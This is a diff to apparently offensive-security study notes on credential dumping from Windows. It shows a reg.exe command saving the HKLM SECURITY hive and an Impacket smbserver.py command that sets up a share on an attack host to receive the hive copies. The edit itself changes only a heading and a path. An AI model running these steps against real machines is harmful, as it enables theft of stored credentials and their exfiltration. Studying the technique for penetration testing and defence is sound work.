@@ -24,9 +24,9 @@ C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
 > Use Impacket's smbserver.py to move the hive copies to a share created on the attack host
 
 
-Syntax for smbserver.py
+###### Syntax for smbserver.py
 ```python
-sudo python3 smbserver.py -smb2support Name_of_Share /path/to/store/on/attack/host
+sudo python3 smbserver.py -smb2support Name_of_Share /path/to/share/on/attack/host
 ```
 
 When share is running on attack host, use the `move` command on Windows to move the hive copies to the share
